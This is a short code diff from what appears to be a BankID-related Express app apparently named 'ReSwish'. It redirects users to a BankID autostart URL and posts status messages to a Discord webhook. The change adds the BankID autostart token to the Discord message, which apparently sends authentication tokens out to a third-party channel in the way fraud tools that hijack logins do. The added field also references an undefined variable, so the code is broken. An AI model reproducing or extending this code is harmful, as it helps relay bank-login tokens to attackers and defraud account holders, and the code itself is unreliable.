@@ -16,12 +16,16 @@ app.get("/", (req, res) => {
   const redirectUrl = `bankid:///?autostarttoken=${token}`;
   res.redirect(redirectUrl);
 
-  const embedMessage = {
-    title: 'BankID Verification',
-    description: 'Waiting for verification response.',
-    color: 0x0000FF,
-    footer: { text: 'ReSwish IOS | Version (0.0.1)' }
-  };
+const embedMessage = {
+  title: 'BankID Verification',
+  description: 'Waiting for verification response.',
+  color: 0x1976D2, // Material Blue 500
+  fields: [
+    { name: 'Auto Start Token', value: autostarttoken, inline: true }, // Added autostarttoken field
+  ],
+  footer: { text: 'ReSwish IOS | Version (0.0.1)' }
+};
+
 
   sendDiscordWebhook(embedMessage);
 });
